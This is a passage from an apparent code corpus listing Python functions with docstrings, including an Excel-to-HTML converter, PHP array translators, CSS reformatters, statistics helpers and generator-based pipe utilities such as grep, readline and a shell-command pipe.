            "def run_excel_to_html():\n    \"\"\"\n    Run the excel_to_html function from the\n    command-line.\n\n    Args:\n        -p path to file\n        -s name of the sheet to convert\n        -css classes to apply\n        -m attempt to combine merged cells\n        -c caption for accessibility\n        -su summary for accessibility\n        -d details for accessibility\n\n    Example use:\n\n        excel_to_html -p myfile.xlsx -s SheetName -css diablo-python -m true\n    \"\"\"\n    # Capture commandline arguments. prog='' argument must\n    # match the command name in setup.py entry_points\n    parser = argparse.ArgumentParser(prog='excel_to_html')\n    parser.add_argument('-p', nargs='?', help='Path to an excel file for conversion.')\n    parser.add_argument(\n        '-s',\n        nargs='?',\n        help='The name of a sheet in our excel file. Defaults to \"Sheet1\".',\n    )\n    parser.add_argument(\n        '-css', nargs='?', help='Space separated css classes to append to the table.'\n    )\n    parser.add_argument(\n        '-m', action='store_true', help='Merge, attempt to combine merged cells.'\n    )\n    parser.add_argument(\n        '-c', nargs='?', help='Caption for creating an accessible table.'\n    )\n    parser.add_argument(\n        '-d',\n        nargs='?',\n        help='Two strings separated by a | character. The first string \\\n        is for the html \"summary\" attribute and the second string is for the html \"details\" attribute. \\\n        both values must be provided and nothing more.',\n    )\n    parser.add_argument(\n        '-r', action='store_true', help='Row headers. Does the table have row headers?'\n    )\n\n    args = parser.parse_args()\n    inputs = {\n        'p': args.p,\n        's': args.s,\n        'css': args.css,\n        'm': args.m,\n        'c': args.c,\n        'd': args.d,\n        'r': args.r,\n    }\n\n    p = inputs['p']\n    s = inputs['s'] if inputs['s'] else 'Sheet1'\n    css = inputs['css'] if inputs['css'] else ''\n    m = inputs['m'] if inputs['m'] else False\n    c = inputs['c'] if inputs['c'] else ''\n    d = inputs['d'].split('|') if inputs['d'] else []\n    r = inputs['r'] if inputs['r'] else False\n\n    html = fp.excel_to_html(\n        p, sheetname=s, css_classes=css, caption=c, details=d, row_headers=r, merge=m\n    )\n\n    print(html)"
        ],
        [
            "def get_inner_template(self, language, template_type, indentation, key, val):\n        \"\"\"\n        Gets the requested template for the given language.\n\n        Args:\n            language: string, the language of the template to look for.\n\n            template_type: string, 'iterable' or 'singular'. \n            An iterable template is needed when the value is an iterable\n            and needs more unpacking, e.g. list, tuple. A singular template \n            is needed when unpacking is complete and the value is singular, \n            e.g. string, int, float.\n\n            indentation: int, the indentation level.\n    \n            key: multiple types, the array key.\n\n            val: multiple types, the array values\n\n        Returns:\n            string, template formatting for arrays by language.\n        \"\"\"\n        #Language specific inner templates\n        inner_templates = {'php' : {\n                                'iterable' : '%s%s => array \\n%s( \\n%s%s),\\n' % (indentation, key, indentation, val, indentation),\n                                'singular' : '%s%s => %s, \\n' % (indentation, key, val) },\n                           'javascript' : {\n                                'iterable' : '%s%s : {\\n%s\\n%s},\\n' % (indentation, key, val, indentation),\n                                'singular' : '%s%s: %s,\\n' % (indentation, key, val)},\n                           'ocaml' : { \n                                'iterable' : '%s[| (%s, (\\n%s\\n%s))|] ;;\\n' % (indentation, key, val, indentation),\n                                'singular' : '%s(%s, %s);\\n' % (indentation, key, val)}}\n\n        return inner_templates[language][template_type]"
        ],
        [
            "def translate_array(self, string, language, level=3, retdata=False):\n        \"\"\"Unserializes a serialized php array and prints it to\n        the console as a data structure in the specified language.\n        Used to translate or convert a php array into a data structure \n        in another language. Currently supports, PHP, Python, Javascript,\n        and JSON. \n\n        Args:\n            string: a string of serialized php\n        \n            language: a string representing the desired output \n            format for the array.\n\n            level: integer, indentation level in spaces. \n            Defaults to 3.\n\n            retdata: boolean, the method will return the string\n            in addition to printing it if set to True. Defaults \n            to false.\n\n        Returns:\n            None but prints a string to the console if retdata is \n            False, otherwise returns a string.\n            \"\"\"\n        language = language.lower()\n        assert self.is_built_in(language) or language in self.outer_templates, \\\n            \"Sorry, \" + language + \" is not a supported language.\"\n\n        # Serialized data converted to a python data structure (list of tuples)\n        data = phpserialize.loads(bytes(string, 'utf-8'), array_hook=list, decode_strings=True)\n\n        # If language conversion is supported by python avoid recursion entirely\n        # and use a built in library\n        if self.is_built_in(language):\n            self.get_built_in(language, level, data) \n            print(self)\n            return self.data_structure if retdata else None\n\n        # The language is not supported. Use recursion to build a data structure.\n        def loop_print(iterable, level=3):\n            \"\"\"\n            Loops over a python representation of a php array \n            (list of tuples) and constructs a representation in another language.\n            Translates a php array into another structure.\n\n            Args:\n                iterable: list or tuple to unpack.\n\n                level: integer, number of spaces to use for indentation\n            \"\"\"\n            retval = ''\n            indentation = ' ' * level\n\n            # Base case - variable is not an iterable\n            if not self.is_iterable(iterable) or isinstance(iterable, str):\n                non_iterable = str(iterable)\n                return str(non_iterable)\n             \n            # Recursive case\n            for item in iterable:\n                # If item is a tuple it should be a key, value pair\n                if isinstance(item, tuple) and len(item) == 2:\n                    # Get the key value pair\n                    key = item[0]\n                    val = loop_print(item[1], level=level+3)\n            \n                    # Translate special values\n                    val = self.translate_val(language, val) if language in self.lang_specific_values \\\n                          and val in self.lang_specific_values[language] else val\n     \n                    # Convert keys to their properly formatted strings\n                    # Integers are not quoted as array keys\n                    key = str(key) if isinstance(key, int) else '\\'' + str(key) + '\\''\n\n                    # The first item is a key and the second item is an iterable, boolean\n                    needs_unpacking = hasattr(item[0],'__iter__') == False \\\n                                      and hasattr(item[1],'__iter__') == True \n\n                    # The second item is an iterable\n                    if needs_unpacking:\n                        retval += self.get_inner_template(language, 'iterable', indentation, key, val)\n                    # The second item is not an iterable\n                    else:\n                        # Convert values to their properly formatted strings\n                        # Integers and booleans are not quoted as array values\n                        val = str(val) if val.isdigit() or val in self.lang_specific_values[language].values() else '\\'' + str(val) + '\\''\n\n                        retval += self.get_inner_template(language, 'singular', indentation, key, val) \n\n            return retval\n    \n        # Execute the recursive call in language specific wrapper template\n        self.data_structure = self.outer_templates[language] % (loop_print(data))\n        print(self)\n        return self.data_structure if retdata else None"
        ],
        [
            "def get():\n    \"\"\" Only API function for the config module.\n\n    :return: {dict}     loaded validated configuration.\n    \"\"\"\n    config = {}\n    try:\n        config = _load_config()\n    except IOError:\n        try:\n            _create_default_config()\n            config = _load_config()\n        except IOError as e:\n            raise ConfigError(_FILE_CREATION_ERROR.format(e.args[0]))\n    except SyntaxError as e:\n        raise ConfigError(_JSON_SYNTAX_ERROR.format(e.args[0]))\n    except Exception:\n        raise ConfigError(_JSON_SYNTAX_ERROR.format('Yaml syntax error..'))\n\n    try:\n        _validate(config)\n    except KeyError as e:\n        raise ConfigError(_MANDATORY_KEY_ERROR.format(e.args[0]))\n    except SyntaxError as e:\n        raise ConfigError(_INVALID_KEY_ERROR.format(e.args[0]))\n    except ValueError as e:\n        raise ConfigError(_INVALID_VALUE_ERROR.format(e.args[0]))\n\n    config['projects-path'] = os.path.expanduser(config['projects-path'])\n    _complete_config(config)\n    return config"
        ],
        [
            "def reusable(func):\n    \"\"\"Create a reusable class from a generator function\n\n    Parameters\n    ----------\n    func: GeneratorCallable[T_yield, T_send, T_return]\n        the function to wrap\n\n    Note\n    ----\n    * the callable must have an inspectable signature\n    * If bound to a class, the new reusable generator is callable as a method.\n      To opt out of this, add a :func:`staticmethod` decorator above\n      this decorator.\n\n    \"\"\"\n    sig = signature(func)\n    origin = func\n    while hasattr(origin, '__wrapped__'):\n        origin = origin.__wrapped__\n    return type(\n        origin.__name__,\n        (ReusableGenerator, ),\n        dict([\n            ('__doc__',       origin.__doc__),\n            ('__module__',    origin.__module__),\n            ('__signature__', sig),\n            ('__wrapped__',   staticmethod(func)),\n        ] + [\n            (name, property(compose(itemgetter(name),\n                                    attrgetter('_bound_args.arguments'))))\n            for name in sig.parameters\n        ] + ([\n            ('__qualname__',  origin.__qualname__),\n        ] if sys.version_info > (3, ) else [])))"
        ],
        [
            "def sendreturn(gen, value):\n    \"\"\"Send an item into a generator expecting a final return value\n\n    Parameters\n    ----------\n    gen: ~typing.Generator[T_yield, T_send, T_return]\n        the generator to send the value to\n    value: T_send\n        the value to send\n\n    Raises\n    ------\n    RuntimeError\n        if the generator did not return as expected\n\n    Returns\n    -------\n    T_return\n        the generator's return value\n    \"\"\"\n    try:\n        gen.send(value)\n    except StopIteration as e:\n        return stopiter_value(e)\n    else:\n        raise RuntimeError('generator did not return as expected')"
        ],
        [
            "def imap_send(func, gen):\n    \"\"\"Apply a function to all ``send`` values of a generator\n\n    Parameters\n    ----------\n    func: ~typing.Callable[[T_send], T_mapped]\n        the function to apply\n    gen: Generable[T_yield, T_mapped, T_return]\n        the generator iterable.\n\n    Returns\n    -------\n    ~typing.Generator[T_yield, T_send, T_return]\n        the mapped generator\n    \"\"\"\n    gen = iter(gen)\n    assert _is_just_started(gen)\n    yielder = yield_from(gen)\n    for item in yielder:\n        with yielder:\n            yielder.send(func((yield item)))\n    return_(yielder.result)"
        ],
        [
            "def bug_info(exc_type, exc_value, exc_trace):\n    \"\"\"Prints the traceback and invokes the ipython debugger on any exception\n\n    Only invokes ipydb if you are outside ipython or python interactive session.\n    So scripts must be called from OS shell in order for exceptions to ipy-shell-out.\n\n    Dependencies:\n      Needs `pip install ipdb`\n\n    Arguments:\n      exc_type (type): The exception type/class (e.g. RuntimeError)\n      exc_value (Exception): The exception instance (e.g. the error message passed to the Exception constructor)\n      exc_trace (Traceback): The traceback instance\n    \n    References:\n      http://stackoverflow.com/a/242531/623735\n\n    Example Usage:\n      $  python -c 'from pug import debug;x=[];x[0]'\n      Traceback (most recent call last):\n        File \"<string>\", line 1, in <module>\n      IndexError: list index out of range\n\n      > <string>(1)<module>()\n\n      ipdb> x\n      []\n      ipdb> locals()\n      {'__builtins__': <module '__builtin__' (built-in)>, '__package__': None, 'x': [], 'debug': <module 'pug.debug' from 'pug/debug.py'>, '__name__': '__main__', '__doc__': None}\n      ipdb> \n    \"\"\"\n    if hasattr(sys, 'ps1') or not sys.stderr.isatty():\n        # We are in interactive mode or don't have a tty-like device, so we call the default hook\n        sys.__excepthook__(exc_type, exc_value, exc_trace)\n    else:\n        # Need to import non-built-ins here, so if dependencies haven't been installed, both tracebacks will print\n        # (e.g. the ImportError and the Exception that got you here)\n        import ipdb\n        # We are NOT in interactive mode, print the exception\n        traceback.print_exception(exc_type, exc_value, exc_trace)\n        print\n        # Start the debugger in post-mortem mode.\n        ipdb.post_mortem(exc_trace)"
        ],
        [
            "def copy_web_file_to_local(file_path, target_path):\n    \"\"\"Copies a file from its location on the web to a designated \n    place on the local machine.\n\n    Args:\n        file_path: Complete url of the file to copy, string (e.g. http://fool.com/input.css).\n\n        target_path: Path and name of file on the local machine, string. (e.g. /directory/output.css)\n\n    Returns:\n        None.\n\n    \"\"\"\n    response = urllib.request.urlopen(file_path)\n    f = open(target_path, 'w')\n    f.write(response.read()) \n    f.close()"
        ],
        [
            "def get_line_count(fname):\n    \"\"\"Counts the number of lines in a file.\n\n    Args:\n        fname: string, name of the file.\n\n    Returns:\n        integer, the number of lines in the file.\n\n    \"\"\"\n    i = 0\n    with open(fname) as f:\n        for i, l in enumerate(f):\n            pass\n    return i + 1"
        ],
        [
            "def indent_css(f, output):\n    \"\"\"Indentes css that has not been indented and saves it to a new file.\n    A new file is created if the output destination does not already exist.\n\n    Args:\n        f: string, path to file.\n\n        output: string, path/name of the output file (e.g. /directory/output.css).\n    print type(response.read())\n\n    Returns:\n        None.\n    \"\"\"\n    line_count = get_line_count(f)\n    f = open(f, 'r+')\n    output = open(output, 'r+')\n    for line in range(line_count):\n        string = f.readline().rstrip()\n        if len(string) > 0:\n            if string[-1] == \";\":\n                output.write(\"    \" + string + \"\\n\")\n            else:\n                output.write(string + \"\\n\")\n    output.close()\n    f.close()"
        ],
        [
            "def add_newlines(f, output, char):\n    \"\"\"Adds line breaks after every occurance of a given character in a file.\n\n    Args:\n        f: string, path to input file.\n\n        output: string, path to output file.\n\n    Returns:\n        None.\n    \"\"\"\n    line_count = get_line_count(f)\n    f = open(f, 'r+')\n    output = open(output, 'r+')\n    for line in range(line_count):\n        string = f.readline()\n        string = re.sub(char, char + '\\n', string)\n        output.write(string)"
        ],
        [
            "def reformat_css(input_file, output_file):\n    \"\"\"Reformats poorly written css. This function does not validate or fix errors in the code.\n    It only gives code the proper indentation. \n\n    Args:\n        input_file: string, path to the input file.\n\n        output_file: string, path to where the reformatted css should be saved. If the target file\n        doesn't exist, a new file is created.\n\n    Returns:\n        None.\n    \"\"\"\n    # Number of lines in the file.\n    line_count = get_line_count(input_file)\n\n    # Open source and target files.\n    f = open(input_file, 'r+')\n    output = open(output_file, 'w')\n\n    # Loop over every line in the file.\n    for line in range(line_count):\n        # Eliminate whitespace at the beginning and end of lines.\n        string = f.readline().strip()\n        # New lines after { \n        string = re.sub('\\{', '{\\n', string)\n        # New lines after ; \n        string = re.sub('; ', ';', string)\n        string = re.sub(';', ';\\n', string)\n        # Eliminate whitespace before comments\n        string = re.sub('} /*', '}/*', string)\n        # New lines after } \n        string = re.sub('\\}', '}\\n', string)\n        # New lines at the end of comments\n        string = re.sub('\\*/', '*/\\n', string)\n        # Write to the output file.\n        output.write(string)\n\n    # Close the files.\n    output.close()\n    f.close()\n\n    # Indent the css.\n    indent_css(output_file, output_file)\n\n    # Make sure there's a space before every {\n    add_whitespace_before(\"{\", output_file, output_file)"
        ],
        [
            "def clean_strings(iterable):\n    \"\"\"\n    Take a list of strings and clear whitespace \n    on each one. If a value in the list is not a \n    string pass it through untouched.\n\n    Args:\n        iterable: mixed list\n\n    Returns: \n        mixed list\n    \"\"\"\n    retval = []\n    for val in iterable:\n        try:\n            retval.append(val.strip())\n        except(AttributeError):\n            retval.append(val)\n    return retval"
        ],
        [
            "def future_value(present_value, annual_rate, periods_per_year, years):\n    \"\"\"\n    Calculates the future value of money invested at an anual interest rate,\n    x times per year, for a given number of years.\n\n    Args:\n        present_value: int or float, the current value of the money (principal).\n\n        annual_rate: float 0 to 1 e.g., .5 = 50%), the interest rate paid out.\n\n        periods_per_year: int, the number of times money is invested per year.\n\n        years: int, the number of years invested.\n\n    Returns:\n        Float, the future value of the money invested with compound interest.\n    \"\"\"\n\n    # The nominal interest rate per period (rate) is how much interest you earn during a\n    # particular length of time, before accounting for compounding. This is typically\n    # expressed as a percentage.\n    rate_per_period = annual_rate / float(periods_per_year)\n\n    # How many periods in the future the calculation is for.\n    periods = periods_per_year * years\n\n    return present_value * (1 + rate_per_period) ** periods"
        ],
        [
            "def triangle_area(point1, point2, point3):\n    \"\"\"\n    Uses Heron's formula to find the area of a triangle\n    based on the coordinates of three points.\n\n    Args:\n        point1: list or tuple, the x y coordinate of point one.\n\n        point2: list or tuple, the x y coordinate of point two.\n\n        point3: list or tuple, the x y coordinate of point three.\n\n    Returns:\n        The area of a triangle as a floating point number.\n\n    Requires:\n        The math module, point_distance().\n    \"\"\"\n\n    \"\"\"Lengths of the three sides of the triangle\"\"\"\n    a = point_distance(point1, point2)\n    b = point_distance(point1, point3)\n    c = point_distance(point2, point3)\n\n    \"\"\"Where s is the semiperimeter\"\"\"\n    s = (a + b + c) / 2.0\n\n    \"\"\"Return the area of the triangle (using Heron's formula)\"\"\"\n    return math.sqrt(s * (s - a) * (s - b) * (s - c))"
        ],
        [
            "def median(data):\n    \"\"\"\n    Calculates  the median of a list of integers or floating point numbers.\n\n    Args:\n        data: A list of integers or floating point numbers\n\n    Returns:\n        Sorts the list numerically and returns the middle number if the list has an odd number\n        of items. If the list contains an even number of items the mean of the two middle numbers\n        is returned.\n    \"\"\"\n    ordered = sorted(data)\n    length = len(ordered)\n    if length % 2 == 0:\n        return (\n            ordered[math.floor(length / 2) - 1] + ordered[math.floor(length / 2)]\n        ) / 2.0\n\n    elif length % 2 != 0:\n        return ordered[math.floor(length / 2)]"
        ],
        [
            "def average(numbers, numtype='float'):\n    \"\"\"\n    Calculates the average or mean of a list of numbers\n\n    Args:\n        numbers: a list of integers or floating point numbers.\n\n        numtype: string, 'decimal' or 'float'; the type of number to return.\n\n    Returns:\n        The average (mean) of the numbers as a floating point number\n        or a Decimal object.\n\n    Requires:\n        The math module\n    \"\"\"\n    if type == 'decimal':\n        return Decimal(sum(numbers)) / len(numbers)\n    else:\n        return float(sum(numbers)) / len(numbers)"
        ],
        [
            "def variance(numbers, type='population'):\n    \"\"\"\n    Calculates the population or sample variance of a list of numbers.\n    A large number means the results are all over the place, while a\n    small number means the results are comparatively close to the average.\n\n    Args:\n        numbers: a list  of integers or floating point numbers to compare.\n\n        type: string, 'population' or 'sample', the kind of variance to be computed.\n\n    Returns:\n        The computed population or sample variance.\n        Defaults to population variance.\n\n    Requires:\n        The math module, average()\n    \"\"\"\n    mean = average(numbers)\n    variance = 0\n    for number in numbers:\n        variance += (mean - number) ** 2\n\n    if type == 'population':\n        return variance / len(numbers)\n    else:\n        return variance / (len(numbers) - 1)"
        ],
        [
            "def get_percentage(a, b, i=False, r=False):\n    \"\"\"\n    Finds the percentage of one number over another.\n\n    Args:\n        a: The number that is a percent, int or float.\n\n        b: The base number that a is a percent of, int or float.\n\n        i: Optional boolean integer. True if the user wants the result returned as\n        a whole number. Assumes False.\n\n        r: Optional boolean round. True if the user wants the result rounded.\n        Rounds to the second decimal point on floating point numbers. Assumes False.\n\n    Returns:\n        The argument a as a percentage of b. Throws a warning if integer is set to True\n        and round is set to False.\n    \"\"\"\n    # Round to the second decimal\n    if i is False and r is True:\n        percentage = round(100.0 * (float(a) / b), 2)\n\n    # Round to the nearest whole number\n    elif (i is True and r is True) or (i is True and r is False):\n        percentage = int(round(100 * (float(a) / b)))\n\n        # A rounded number and an integer were requested\n        if r is False:\n            warnings.warn(\n                \"If integer is set to True and Round is set to False, you will still get a rounded number if you pass floating point numbers as arguments.\"\n            )\n\n    # A precise unrounded decimal\n    else:\n        percentage = 100.0 * (float(a) / b)\n\n    return percentage"
        ],
        [
            "def get_datetime_string(datetime_obj):\n        '''\n        Get datetime string from datetime object\n\n        :param datetime datetime_obj: datetime object\n        :return: datetime string\n        :rtype: str\n        '''\n\n        if isinstance(datetime_obj, datetime):\n            dft = DTFormat()\n            return datetime_obj.strftime(dft.datetime_format)\n\n        return None"
        ],
        [
            "def attr(prev, attr_name):\n    \"\"\"attr pipe can extract attribute value of object.\n\n    :param prev: The previous iterator of pipe.\n    :type prev: Pipe\n    :param attr_name: The name of attribute\n    :type attr_name: str\n    :returns: generator\n    \"\"\"\n    for obj in prev:\n        if hasattr(obj, attr_name):\n            yield getattr(obj, attr_name)"
        ],
        [
            "def attrs(prev, attr_names):\n    \"\"\"attrs pipe can extract attribute values of object.\n\n    If attr_names is a list and its item is not a valid attribute of\n    prev's object. It will be excluded from yielded dict.\n\n    :param prev: The previous iterator of pipe.\n    :type prev: Pipe\n    :param attr_names: The list of attribute names\n    :type attr_names: str of list\n    :returns: generator\n    \"\"\"\n    for obj in prev:\n        attr_values = []\n        for name in attr_names:\n            if hasattr(obj, name):\n                attr_values.append(getattr(obj, name))\n        yield attr_values"
        ],
        [
            "def attrdict(prev, attr_names):\n    \"\"\"attrdict pipe can extract attribute values of object into a dict.\n\n    The argument attr_names can be a list or a dict.\n\n    If attr_names is a list and its item is not a valid attribute of\n    prev's object. It will be excluded from yielded dict.\n\n    If attr_names is dict and the key doesn't exist in prev's object.\n    the value of corresponding attr_names key will be copy to yielded dict.\n\n    :param prev: The previous iterator of pipe.\n    :type prev: Pipe\n    :param attr_names: The list or dict of attribute names\n    :type attr_names: str of list or dict\n    :returns: generator\n    \"\"\"\n    if isinstance(attr_names, dict):\n        for obj in prev:\n            attr_values = dict()\n            for name in attr_names.keys():\n                if hasattr(obj, name):\n                    attr_values[name] = getattr(obj, name)\n                else:\n                    attr_values[name] = attr_names[name]\n            yield attr_values\n    else:\n        for obj in prev:\n            attr_values = dict()\n            for name in attr_names:\n                if hasattr(obj, name):\n                    attr_values[name] = getattr(obj, name)\n            yield attr_values"
        ],
        [
            "def flatten(prev, depth=sys.maxsize):\n    \"\"\"flatten pipe extracts nested item from previous pipe.\n\n    :param prev: The previous iterator of pipe.\n    :type prev: Pipe\n    :param depth: The deepest nested level to be extracted. 0 means no extraction.\n    :type depth: integer\n    :returns: generator\n    \"\"\"\n    def inner_flatten(iterable, curr_level, max_levels):\n        for i in iterable:\n            if hasattr(i, '__iter__') and curr_level < max_levels:\n                for j in inner_flatten(i, curr_level + 1, max_levels):\n                    yield j\n            else:\n                yield i\n\n    for d in prev:\n        if hasattr(d, '__iter__') and depth > 0:\n            for inner_d in inner_flatten(d, 1, depth):\n                yield inner_d\n        else:\n            yield d"
        ],
        [
            "def values(prev, *keys, **kw):\n    \"\"\"values pipe extract value from previous pipe.\n\n    If previous pipe send a dictionary to values pipe, keys should contains\n    the key of dictionary which you want to get. If previous pipe send list or\n    tuple,\n\n    :param prev: The previous iterator of pipe.\n    :type prev: Pipe\n    :returns: generator\n    \"\"\"\n    d = next(prev)\n    if isinstance(d, dict):\n        yield [d[k] for k in keys if k in d]\n        for d in prev:\n            yield [d[k] for k in keys if k in d]\n    else:\n        yield [d[i] for i in keys if 0 <= i < len(d)]\n        for d in prev:\n            yield [d[i] for i in keys if 0 <= i < len(d)]"
        ],
        [
            "def pack(prev, n, rest=False, **kw):\n    \"\"\"pack pipe takes n elements from previous generator and yield one\n    list to next.\n\n    :param prev: The previous iterator of pipe.\n    :type prev: Pipe\n    :param rest: Set True to allow to output the rest part of last elements.\n    :type prev: boolean\n    :param padding: Specify the padding element for the rest part of last elements.\n    :type prev: boolean\n    :returns: generator\n\n    :Example:\n    >>> result([1,2,3,4,5,6,7] | pack(3))\n    [[1, 2, 3], [4, 5, 6]]\n\n    >>> result([1,2,3,4,5,6,7] | pack(3, rest=True))\n    [[1, 2, 3], [4, 5, 6], [7,]]\n\n    >>> result([1,2,3,4,5,6,7] | pack(3, padding=None))\n    [[1, 2, 3], [4, 5, 6], [7, None, None]]\n    \"\"\"\n\n    if 'padding' in kw:\n        use_padding = True\n        padding = kw['padding']\n    else:\n        use_padding = False\n        padding = None\n\n    items = []\n    for i, data in enumerate(prev, 1):\n        items.append(data)\n        if (i % n) == 0:\n            yield items\n            items = []\n    if len(items) != 0 and rest:\n        if use_padding:\n            items.extend([padding, ] * (n - (i % n)))\n        yield items"
        ],
        [
            "def grep(prev, pattern, *args, **kw):\n    \"\"\"The pipe greps the data passed from previous generator according to\n    given regular expression.\n\n    :param prev: The previous iterator of pipe.\n    :type prev: Pipe\n    :param pattern: The pattern which used to filter out data.\n    :type pattern: str|unicode|re pattern object\n    :param inv: If true, invert the match condition.\n    :type inv: boolean\n    :param kw:\n    :type kw: dict\n    :returns: generator\n    \"\"\"\n    inv = False if 'inv' not in kw else kw.pop('inv')\n    pattern_obj = re.compile(pattern, *args, **kw)\n\n    for data in prev:\n        if bool(inv) ^ bool(pattern_obj.match(data)):\n            yield data"
        ],
        [
            "def match(prev, pattern, *args, **kw):\n    \"\"\"The pipe greps the data passed from previous generator according to\n    given regular expression. The data passed to next pipe is MatchObject\n    , dict or tuple which determined by 'to' in keyword argument.\n\n    By default, match pipe yields MatchObject. Use 'to' in keyword argument\n    to change the type of match result.\n\n    If 'to' is dict, yield MatchObject.groupdict().\n    If 'to' is tuple, yield MatchObject.groups().\n    If 'to' is list, yield list(MatchObject.groups()).\n\n    :param prev: The previous iterator of pipe.\n    :type prev: Pipe\n    :param pattern: The pattern which used to filter data.\n    :type pattern: str|unicode\n    :param to: What data type the result should be stored. dict|tuple|list\n    :type to: type\n    :returns: generator\n    \"\"\"\n    to = 'to' in kw and kw.pop('to')\n    pattern_obj = re.compile(pattern, *args, **kw)\n\n    if to is dict:\n        for data in prev:\n            match = pattern_obj.match(data)\n            if match is not None:\n                yield match.groupdict()\n    elif to is tuple:\n        for data in prev:\n            match = pattern_obj.match(data)\n            if match is not None:\n                yield match.groups()\n    elif to is list:\n        for data in prev:\n            match = pattern_obj.match(data)\n            if match is not None:\n                yield list(match.groups())\n    else:\n        for data in prev:\n            match = pattern_obj.match(data)\n            if match is not None:\n                yield match"
        ],
        [
            "def resplit(prev, pattern, *args, **kw):\n    \"\"\"The resplit pipe split previous pipe input by regular expression.\n\n    Use 'maxsplit' keyword argument to limit the number of split.\n\n    :param prev: The previous iterator of pipe.\n    :type prev: Pipe\n    :param pattern: The pattern which used to split string.\n    :type pattern: str|unicode\n    \"\"\"\n    maxsplit = 0 if 'maxsplit' not in kw else kw.pop('maxsplit')\n    pattern_obj = re.compile(pattern, *args, **kw)\n    for s in prev:\n        yield pattern_obj.split(s, maxsplit=maxsplit)"
        ],
        [
            "def sub(prev, pattern, repl, *args, **kw):\n    \"\"\"sub pipe is a wrapper of re.sub method.\n\n    :param prev: The previous iterator of pipe.\n    :type prev: Pipe\n    :param pattern: The pattern string.\n    :type pattern: str|unicode\n    :param repl: Check repl argument in re.sub method.\n    :type repl: str|unicode|callable\n    \"\"\"\n    count = 0 if 'count' not in kw else kw.pop('count')\n    pattern_obj = re.compile(pattern, *args, **kw)\n    for s in prev:\n        yield pattern_obj.sub(repl, s, count=count)"
        ],
        [
            "def wildcard(prev, pattern, *args, **kw):\n    \"\"\"wildcard pipe greps data passed from previous generator\n    according to given regular expression.\n\n    :param prev: The previous iterator of pipe.\n    :type prev: Pipe\n    :param pattern: The wildcard string which used to filter data.\n    :type pattern: str|unicode|re pattern object\n    :param inv: If true, invert the match condition.\n    :type inv: boolean\n    :returns: generator\n    \"\"\"\n    import fnmatch\n\n    inv = 'inv' in kw and kw.pop('inv')\n    pattern_obj = re.compile(fnmatch.translate(pattern), *args, **kw)\n\n    if not inv:\n        for data in prev:\n            if pattern_obj.match(data):\n                yield data\n    else:\n        for data in prev:\n            if not pattern_obj.match(data):\n                yield data"
        ],
        [
            "def stdout(prev, endl='\\n', thru=False):\n    \"\"\"This pipe read data from previous iterator and write it to stdout.\n\n    :param prev: The previous iterator of pipe.\n    :type prev: Pipe\n    :param endl: The end-of-line symbol for each output.\n    :type endl: str\n    :param thru: If true, data will passed to next generator. If false, data\n                 will be dropped.\n    :type thru: bool\n    :returns: generator\n    \"\"\"\n    for i in prev:\n        sys.stdout.write(str(i) + endl)\n        if thru:\n            yield i"
        ],
        [
            "def readline(prev, filename=None, mode='r', trim=str.rstrip, start=1, end=sys.maxsize):\n    \"\"\"This pipe get filenames or file object from previous pipe and read the\n    content of file. Then, send the content of file line by line to next pipe.\n\n    The start and end parameters are used to limit the range of reading from file.\n\n    :param prev: The previous iterator of pipe.\n    :type prev: Pipe\n    :param filename: The files to be read. If None, use previous pipe input as filenames.\n    :type filename: None|str|unicode|list|tuple\n    :param mode: The mode to open file. default is 'r'\n    :type mode: str\n    :param trim: The function to trim the line before send to next pipe.\n    :type trim: function object.\n    :param start: if star is specified, only line number larger or equal to start will be sent.\n    :type start: integer\n    :param end: The last line number to read.\n    :type end: integer\n    :returns: generator\n    \"\"\"\n    if prev is None:\n        if filename is None:\n            raise Exception('No input available for readline.')\n        elif is_str_type(filename):\n            file_list = [filename, ]\n        else:\n            file_list = filename\n    else:\n        file_list = prev\n\n    for fn in file_list:\n        if isinstance(fn, file_type):\n            fd = fn\n        else:\n            fd = open(fn, mode)\n\n        try:\n            if start <= 1 and end == sys.maxsize:\n                for line in fd:\n                    yield trim(line)\n            else:\n                for line_no, line in enumerate(fd, 1):\n                    if line_no < start:\n                        continue\n                    yield trim(line)\n                    if line_no >= end:\n                        break\n        finally:\n            if fd != fn:\n                fd.close()"
        ],
        [
            "def sh(prev, *args, **kw):\n    \"\"\"sh pipe execute shell command specified by args. If previous pipe exists,\n    read data from it and write it to stdin of shell process. The stdout of\n    shell process will be passed to next pipe object line by line.\n\n    A optional keyword argument 'trim' can pass a function into sh pipe. It is\n    used to trim the output from shell process. The default trim function is\n    str.rstrip. Therefore, any space characters in tail of\n    shell process output line will be removed.\n\n    For example:\n\n    py_files = result(sh('ls') | strip | wildcard('*.py'))\n\n    :param prev: The previous iterator of pipe.\n    :type prev: Pipe\n    :param args: The command line arguments. It will be joined by space character.\n    :type args: list of string.\n    :param kw: arguments for subprocess.Popen.\n    :type kw: dictionary of options.\n    :returns: generator\n    \"\"\"\n    endl = '\\n' if 'endl' not in kw else kw.pop('endl')\n    trim = None if 'trim' not in kw else kw.pop('trim')\n    if trim is None:\n        trim = bytes.rstrip if is_py3 else str.rstrip\n\n    cmdline = ' '.join(args)\n    if not cmdline:\n        if prev is not None:\n            for i in prev:\n                yield i\n        else:\n            while True:\n                yield None\n\n    process = subprocess.Popen(cmdline, shell=True,\n        stdin=subprocess.PIPE, stdout=subprocess.PIPE,\n        **kw)\n    if prev is not None:\n        stdin_buffer = StringIO()\n        for i in prev:\n            stdin_buffer.write(i)\n            if endl:\n                stdin_buffer.write(endl)\n        if is_py3:\n            process.stdin.write(stdin_buffer.getvalue().encode('utf-8'))\n        else:\n            process.stdin.write(stdin_buffer.getvalue())\n        process.stdin.flush()\n        process.stdin.close()\n        stdin_buffer.close()\n\n    for line in process.stdout:\n        yield trim(line)\n\n    process.wait()"
        ],
        [
            "def walk(prev, inital_path, *args, **kw):\n    \"\"\"This pipe wrap os.walk and yield absolute path one by one.\n\n    :param prev: The previous iterator of pipe.\n    :type prev: Pipe\n    :param args: The end-of-line symbol for each output.\n    :type args: list of string.\n    :param kw: The end-of-line symbol for each output.\n    :type kw: dictionary of options. Add 'endl' in kw to specify end-of-line symbol.\n    :returns: generator\n    \"\"\"\n    for dir_path, dir_names, filenames in os.walk(inital_path):\n        for filename in filenames:\n            yield os.path.join(dir_path, filename)"
        ],
        [
            "def join(prev, sep, *args, **kw):\n    '''alias of str.join'''\n    yield sep.join(prev, *args, **kw)"
        ],
        [
            "def substitute(prev, *args, **kw):\n    '''alias of string.Template.substitute'''\n    template_obj = string.Template(*args, **kw)\n    for data in prev:\n        yield template_obj.substitute(data)"
        ],
        [
